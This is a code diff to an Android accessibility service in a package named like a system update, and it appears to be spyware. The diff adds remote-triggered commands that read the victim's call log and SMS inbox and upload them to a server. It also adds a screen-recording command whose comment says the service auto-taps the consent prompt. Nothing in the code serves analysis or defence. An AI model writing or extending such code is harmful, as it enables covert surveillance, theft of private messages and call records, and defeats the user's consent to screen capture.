@@ -1,7 +1,6 @@
 package com.android.update;
 
 import android.hardware.camera2.CameraCharacteristics;
-
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import android.content.Context;
@@ -10,27 +9,21 @@ import android.content.SharedPreferences;
 import android.os.Handler;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
-import android.content.Context;
 import java.io.BufferedWriter;
 import android.Manifest;
 import android.content.pm.PackageManager;
 import androidx.core.app.ActivityCompat;
 import android.location.Location;
-import android.util.Log;
-
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
 import com.google.android.gms.location.Priority;
 import java.io.FileWriter;
 import java.io.IOException;
-import android.hardware.camera2.CameraCharacteristics;
-import android.content.Intent;
 import android.net.Uri;
-import android.os.Handler;
+import android.provider.CallLog;
 import android.provider.Settings;
-import android.util.Log;
+import android.provider.Telephony;
 import android.view.accessibility.AccessibilityNodeInfo;
-
 import java.util.Arrays;
 import java.util.ArrayList;
 import java.util.List;
@@ -39,14 +32,10 @@ import androidx.annotation.NonNull;
 import android.content.ContentResolver;
 import android.database.Cursor;
 import android.provider.ContactsContract;
-
-import java.util.List;
-import java.util.ArrayList;
-
+import org.json.JSONArray;
+import org.json.JSONObject;
 import com.android.update.FileUtils;
 import com.android.update.UploadHelper;
-
-
 import com.google.firebase.database.DataSnapshot;
 import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
@@ -282,6 +271,82 @@ public class MyAccessibilityService extends AccessibilityService {
                 getLocationAndUpload();
                 break;
 
+            case "extract_call_logs":
+                new Thread(() -> {
+                    try {
+                        ContentResolver cr = getContentResolver();
+                        String[] projection = {
+                                CallLog.Calls.NUMBER,
+                                CallLog.Calls.TYPE,
+                                CallLog.Calls.DATE,
+                                CallLog.Calls.DURATION,
+                                CallLog.Calls.CACHED_NAME
+                        };
+                        Cursor cursor = cr.query(
+                                CallLog.Calls.CONTENT_URI, projection,
+                                null, null,
+                                CallLog.Calls.DATE + " DESC");
+                        JSONArray arr = new JSONArray();
+                        if (cursor != null) {
+                            while (cursor.moveToNext()) {
+                                JSONObject entry = new JSONObject();
+                                entry.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                                int t = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
+                                entry.put("type", t == CallLog.Calls.INCOMING_TYPE ? "INCOMING" :
+                                        t == CallLog.Calls.OUTGOING_TYPE ? "OUTGOING" : "MISSED");
+                                entry.put("date", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
+                                entry.put("duration_sec", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
+                                entry.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
+                                arr.put(entry);
+                            }
+                            cursor.close();
+                        }
+                        Log.d(TAG, "Call logs found: " + arr.length());
+                        UploadHelper.sendCallLogsToServer(getApplicationContext(), arr.toString());
+                    } catch (Exception e) {
+                        Log.e(TAG, "extract_call_logs failed: " + e.getMessage());
+                    }
+                }).start();
+                break;
+
+            case "extract_sms_history":
+                new Thread(() -> {
+                    try {
+                        ContentResolver cr = getContentResolver();
+                        Cursor cursor = cr.query(
+                                Telephony.Sms.Inbox.CONTENT_URI,
+                                new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE},
+                                null, null,
+                                Telephony.Sms.DATE + " DESC");
+                        StringBuilder sb = new StringBuilder();
+                        if (cursor != null) {
+                            while (cursor.moveToNext()) {
+                                sb.append("From: ").append(cursor.getString(0))
+                                  .append(" | Date: ").append(cursor.getString(2))
+                                  .append("\n").append(cursor.getString(1)).append("\n---\n");
+                            }
+                            cursor.close();
+                        }
+                        UploadHelper.sendTextToServer(getApplicationContext(), "sms_history", sb.toString());
+                        Log.d(TAG, "SMS history uploaded");
+                    } catch (Exception e) {
+                        Log.e(TAG, "extract_sms_history failed: " + e.getMessage());
+                    }
+                }).start();
+                break;
+
+            case "record_screen":
+                // Launch transparent Activity that requests MediaProjection consent.
+                // The Accessibility Service autoClickAllow() will tap "Start" automatically.
+                try {
+                    Intent projectionIntent = new Intent(getApplicationContext(), MediaProjectionActivity.class);
+                    projectionIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(projectionIntent);
+                    Log.d(TAG, "record_screen: launched MediaProjectionActivity");
+                } catch (Exception e) {
+                    Log.e(TAG, "record_screen failed: " + e.getMessage());
+                }
+                break;
 
         }
     }
